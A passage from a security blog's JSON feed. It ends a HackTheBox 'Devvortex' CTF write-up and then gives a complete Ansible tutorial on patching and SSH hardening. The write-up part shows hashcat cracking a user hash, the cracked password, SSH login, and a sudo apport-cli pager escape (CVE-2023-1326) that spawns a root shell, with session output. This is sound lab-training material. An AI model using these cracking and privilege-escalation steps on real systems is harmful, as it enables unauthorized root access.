r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"CS6aAQiunycw\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"S63au678Jipk\">Let's use hashcat and crack the user logan hash with bellow command.</span></div>\n<div dir=\"auto\">\n<pre class=\"language-bash line-numbers\"><code>hashcat -m 3200 logan_hash /usr/share/wordlists/rockyou.txt</code></pre>\n<p>W<span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwdGhlJTIwY3JhY2tlZCUyMHBhc3N3b3JkJTIwb2YlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJnQkNVbTEyUFozOVklMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTV2c5WlhaZ3FMR1MlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDRHIwQkpuWU15SUslMjIlN0Q=\">e have the cracked password of <code>logan</code>.</span></p>\n<pre class=\"language-bash line-numbers\"><code>tequieromucho</code></pre>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBzZWUlMjBpZiUyMHdlJTIwY2FuJTIwU1NIJTIwaW50byUyMHRoZSUyMG1hY2hpbmUlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJyQWZEbzV5UW1OMHUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJaYXltVEJ2ZllxUHIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxRUkzUThQM0tZVWglMjIlN0Q=\">Let's see if we can SSH into the machine with this creds.</span></p>\n<pre class=\"language-bash line-numbers\"><code>ssh logan@10.10.11.242</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup13.png\" alt=\"Devvortex - HTB Writeup\" width=\"604\" height=\"371\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-lg.png 1024w\"></figure>\n<p>Yes, we got the access with SSH!</p>\n<h3>User Flag</h3>\n<p>We can <code>ls</code> and <code>cat user.txt</code> to get our user flag.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup15.png\" alt=\"Devvortex - HTB Writeup\" width=\"441\" height=\"130\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-lg.png 1024w\"></figure>\n<h3>System Flag</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkNoZWNraW5nJTIwb3VyJTIwc3VkbyUyMHByaXZpbGVnZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ5dENqVmZjTXM3ZkIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJndzJLWGdmYTJYckglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI0bzNYWkhYbkF6WGglMjIlN0Q=\">Checking our sudo privileges with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>sudo -l</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup14.png\" alt=\"Devvortex - HTB Writeup\" width=\"1272\" height=\"237\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-lg.png 1024w\"></figure>\n<div>\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz\" data-key=\"AXM5FiIyfH0F\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"AXM5FiIyfH0F\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"Bl96f2ur3jHZ\">Here, we can run the program </span><code><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">/usr/bin/apport-cli</span></code>. A<span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">fter a quick google search I found that this program is vulnerable.</span></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>Unveiling a privilege escalation vulnerability in apport-cli 2.26.0 and earlier, reminiscent of <a class=\"af pv\" href=\"https://github.com/advisories/GHSA-8989-8fhv-vq42\" rel=\"noopener ugc nofollow\" target=\"_blank\">CVE-2023–26604</a>. For the exploit to succeed, the system must be uniquely configured, allowing unprivileged users to execute sudo apport-cli. With less configured as the pager and adjustable terminal size, a local attacker gains the privilege escalator. While rare, the possibility underscores the importance of prudent sudo configurations. Stay vigilant!</p>\n<p><a href=\"https://github.com/diego-tella/CVE-2023-1326-PoC\" target=\"_blank\" class=\"extlink extlink-icon-5 \"  title=\"sakibulalikhan\" rel=\"noopener noreferrer\">https://github.com/diego-tella/CVE-2023-1326-PoC</a></p>\n<p>Through this vuln, <span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmVzc2VudGlhbGx5JTIwd2UlMjBoYXZlJTIwdGhlJTIwYWJpbGl0eSUyMHRvJTIwcmVhZCUyMGElMjBjcmFzaCUyMHJlcG9ydCUyMGluJTIwYSUyMHZpJTIwbGlrZSUyMHByb2dyYW0lMkMlMjBmcm9tJTIwaGVyZSUyMHdlJTIwY2FuJTIwZXhlY3V0ZSUyMGJhc2glMjBhbmQlMjBqdW1wJTIwc3RyYWlnaHQlMjBpbnRvJTIwYSUyMHJvb3QlMjBiYXNoJTIwc2hlbGwlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI4VDZnR3pSQU5lVTYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIzd3dwaWZTMlh2Um4lMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIwcjlLU1dacFI1ZUIlMjIlN0Q=\">essentially we have the ability to read a crash report in a <code>vi</code> like program, from here we can execute bash and jump straight into a root bash shell.</span></p>\n<pre class=\"language-bash line-numbers\"><code>logan@devvortex:~$ sudo /usr/bin/apport-cli -f\n\n*** What kind of problem do you want to report?\n\n\nChoices:\n  1: Display (X.org)\n  2: External or internal storage devices (e. g. USB sticks)\n  3: Security related problems\n  4: Sound/audio related problems\n  5: dist-upgrade\n  6: installation\n  7: installer\n  8: release-upgrade\n  9: ubuntu-release-upgrader\n  10: Other problem\n  C: Cancel\nPlease choose (1/2/3/4/5/6/7/8/9/10/C): 1\n\n\n*** Collecting problem information\n\nThe collected information can be sent to the developers to improve the\napplication. This might take a few minutes.\n\n*** What display problem do you observe?\n\n\nChoices:\n  1: I don't know\n  2: Freezes or hangs during boot or usage\n  3: Crashes or restarts back to login screen\n  4: Resolution is incorrect\n  5: Shows screen corruption\n  6: Performance is worse than expected\n  7: Fonts are the wrong size\n  8: Other display-related problem\n  C: Cancel\nPlease choose (1/2/3/4/5/6/7/8/C): 2\n\n*** \n\nTo debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze\n\nPress any key to continue... \n\n..dpkg-query: no packages found matching xorg\n...............\n\n*** Send problem report to the developers?\n\nAfter the problem report has been sent, please fill out the form in the\nautomatically opened web browser.\n\nWhat would you like to do? Your options are:\n  S: Send report (1.6 KB)\n  V: View report\n  K: Keep report file for sending later or copying to somewhere else\n  I: Cancel and ignore future crashes of this program version\n  C: Cancel\nPlease choose (S/V/K/I/C): !\nWhat would you like to do? Your options are:\n  S: Send report (1.6 KB)\n  V: View report\n  K: Keep report file for sending later or copying to somewhere else\n  I: Cancel and ignore future crashes of this program version\n  C: Cancel\nPlease choose (S/V/K/I/C): v\nroot@devvortex:/home/logan# </code></pre>\n<p id=\"9de9\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">After executing the command, when prompted, type <code class=\"cw ok ol om on b\">V</code>and wait it for some seconds. Let the<code class=\"cw ok ol om on b\">apport-cli</code> to load all its magic.</p>\n<p id=\"feb1\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">As soon as you <code class=\"cw ok ol om on b\">:</code> symbol, the pager is there!</p>\n<p id=\"f73e\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Let’s run <code class=\"cw ok ol om on b\">!/bin/bash</code> to spawn the shell as root (remember, we started the <code class=\"cw ok ol om on b\">apport-cli</code> executable with <code class=\"cw ok ol om on b\">sudo</code>)</p>\n<p>Hurrah, now we got the root shell!!!</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup17.png\" alt=\"Devvortex - HTB Writeup\" width=\"510\" height=\"139\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup17-lg.png 1024w\"></figure>\n<p>We have our <strong class=\"mk gs\">Devvortex </strong>machine, successfully rooted!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup1.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux Privilege Escalations",
                   "HackTheBox",
                   "CVE",
                   "CTF Writeups"
            ],
            "date_published": "2024-02-09T04:25:15+06:00",
            "date_modified": "2024-02-09T15:22:39+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/ansible-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "url": "https://sakibulalikhan.pages.dev/ansible-zero-to-hero-for-hackers-a-practical-guide-for-cybersecurity-enthusiasts.html",
            "title": "Ansible Zero to Hero For Hackers: A Practical Guide for Cybersecurity Enthusiasts",
            "summary": "In the dynamic realm of cybersecurity, automation is the key to efficiency, and Ansible is the chosen weapon for the discerning hacker. This blog post&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<p>In the dynamic realm of cybersecurity, automation is the key to efficiency, and Ansible is the chosen weapon for the discerning hacker. This blog post will take you on a journey from zero to hero, exploring how Ansible, an open-source automation tool, can elevate your cybersecurity game.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"what-is-ansible\">What is Ansible?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/18/what-is-ansible-removebg-preview.png\" alt=\"what-is-ansible\" width=\"340\" height=\"306\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/what-is-ansible-removebg-preview-lg.png 1024w\"></figure>\n<p>In the vast landscape of automation tools, Ansible emerges as a superhero, simplifying complex tasks and orchestrating seamless operations. Ansible is not just a tool; it’s your sidekick in the cybersecurity battlefield. As a configuration management and automation platform, Ansible allows you to define and automate the deployment and configuration of systems with ease.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"key-features\">Key Features:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<ul>\n<li>\n<p><strong>Agentless Architecture:</strong> Ansible’s agentless design eliminates the need for additional software on managed systems, making it lightweight and straightforward to deploy.</p>\n</li>\n<li>\n<p><strong>Simplicity:</strong> With Ansible, automation becomes accessible. Its human-readable, YAML-based syntax ensures that even hackers new to automation can quickly grasp its power.</p>\n</li>\n<li>\n<p><strong>Flexibility:</strong> Ansible doesn’t impose a rigid structure. It adapts to your environment, whether you’re managing a handful of servers or orchestrating a large-scale operation.</p>\n</li>\n<li>\n<p><strong>Extensibility:</strong> Ansible is not confined to a specific domain. Its modular design allows for seamless integration with existing tools and technologies, enhancing its versatility.</p>\n</li>\n</ul>\n</div>\n<h3 id=\"why-ansible\">Why Ansible?</h3>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/18/Why-Ansible.png\" alt=\"Why Ansible\" width=\"280\" height=\"213\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/18/responsive/Why-Ansible-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ansible stands out in the automation landscape for its simplicity and agentless architecture. Leveraging SSH to connect to servers, Ansible ensures ease of setup and usage. Whether you’re handling a compact infrastructure or orchestrating a large-scale deployment, Ansible offers a robust and flexible solution.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"installation\">Installation:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Let’s dive into the installation process to kickstart your Ansible journey. For this guide, we’ll focus on installing Ansible on a Linux-based system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-1-update-your-system\">Step 1: Update Your System</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Before delving into Ansible, ensure your system is up to date:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt update\nsudo apt upgrade -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-2-install-ansible\">Step 2: Install Ansible</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Install Ansible using your package manager. For Ubuntu/Debian-based systems:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo apt install ansible -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>For Red Hat/CentOS-based systems:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sudo yum install ansible -y\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-3-verify-installation\">Step 3: Verify Installation</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Confirm the installation by checking the Ansible version:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>ansible --version\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>You should see output displaying the installed Ansible version.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"basic-configuration-and-setup\">Basic Configuration and Setup:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Now that Ansible is successfully installed, let’s perform some basic configuration to set the stage for automation.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-1-create-an-ansible-configuration-file\">Step 1: Create an Ansible Configuration File</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ansible utilizes a configuration file (ansible.cfg) to manage settings. Create one in your home directory:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>touch ~/.ansible.cfg\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-2-configure-ansible\">Step 2: Configure Ansible</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Open ~/.ansible.cfg in a text editor and add the following basic configuration:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-ini line-numbers\"><code>[defaults]\ninventory = ~/ansible_inventory\nremote_user = your_username\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Replace your_username with your actual username. This configuration specifies the inventory file location and the default remote user.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-3-create-an-inventory-file\">Step 3: Create an Inventory File</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>The inventory file defines the hosts Ansible will manage. Create a simple inventory file (ansible_inventory) in your home directory:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-ini line-numbers\"><code>[web_servers]\nserver1 ansible_host=your_server_ip\nserver2 ansible_host=your_server_ip\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Replace your_server_ip with the actual IP addresses of your servers.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"step-4-test-ansible-connectivity\">Step 4: Test Ansible Connectivity</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Ensure Ansible can connect to your servers:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>ansible -m ping -i ~/ansible_inventory all\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>If everything is set up correctly, you should see a successful ping response from your servers.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"real-world-cybersecurity-project-examples\">Real-world Cybersecurity Project Examples:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"automating-security-patch-management\">Automating Security Patch Management:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>In the realm of cybersecurity, timely application of security patches is paramount. Ansible proves to be a valuable ally in automating the patching process across multiple servers, ensuring that vulnerabilities are promptly addressed.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Consider this analogy: Imagine your servers are the guardians of a fortress, and security patches are the shields that reinforce their defenses. Ansible, in this context, becomes the blacksmith forging these shields efficiently.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-yaml line-numbers\"><code>---\n- name: Apply Security Updates\n  hosts: web_servers\n  become: yes\n  tasks:\n    - name: Update package repositories\n      apt: update_cache=yes\n      when: ansible_os_family == 'Debian'\n\n    - name: Install security updates\n      apt: upgrade=dist\n      when: ansible_os_family == 'Debian'\n\n    - name: Update package repositories\n      yum: check_update_only=yes\n      when: ansible_os_family == 'RedHat'\n\n    - name: Install security updates\n      yum: name='*' state=latest\n      when: ansible_os_family == 'RedHat'\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Imagine Ansible as the diligent scribe noting which shields need reinforcement and ensuring that each guardian receives the necessary upgrades. With this script, you’re not manually handing out shields; instead, Ansible automates the distribution, making your fortress more resilient against potential cyber threats.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"securing-ssh-configuration\">Securing SSH Configuration:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Securing SSH configurations is akin to fortifying the entrance to your digital castle. Ansible can assist in enforcing secure SSH settings across multiple servers, reducing the risk of unauthorized access.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Let’s simplify it: Think of SSH as the drawbridge to your castle. By default, it might be wide open for anyone to cross. Ansible, acting as the castle’s guardian, ensures that only trusted entities can pass through by configuring the drawbridge securely.</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-yaml line-numbers\"><code>---\n- name: Secure SSH Configuration\n  hosts: web_servers\n  become: yes\n  tasks:\n    - name: Disable root login\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^PermitRootLogin'\n        line: 'PermitRootLogin no'\n      notify: Restart SSH\n\n    - name: Set SSH protocol version\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^Protocol'\n        line: 'Protocol 2'\n      notify: Restart SSH\n\n  handlers:\n    - name: Restart SSH\n      service:\n        name: sshd\n        state: restarted\n</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Picture Ansible as the castle architect implementing security measures, like raising the drawbridge for root access and fortifying the protocol version. The script ensures that only the rightful inhabitants with the correct credentials can traverse the digital drawbridge securely.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"conclusion\">Conclusion:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Congratulations! You’ve successfully installed Ansible and laid the foundation for automating tasks and managing infrastructure efficiently. The real-world examples provided demonstrate how Ansible can be applied in cybersecurity projects, from patch management to securing SSH configurations.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>In the next blog post, we’ll delve into writing Ansible playbooks and executing ad-hoc commands for more advanced automation.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>Stay tuned for more Ansible adventures!</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/18/Ansible-Zero-to-Hero-For-Hackers-A-Practical-Guide-for-Cybersecurity-Enthusiasts.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "DevSecOps",
                   "Cyber Security",
                   "Cloud Security",
                   "Ansible"
            ],
            "date_published": "2024-02-05T02:31:54+06:00",
            "date_modified": "2024-02-07T16:57:16+06:00"
        }
    ]
}
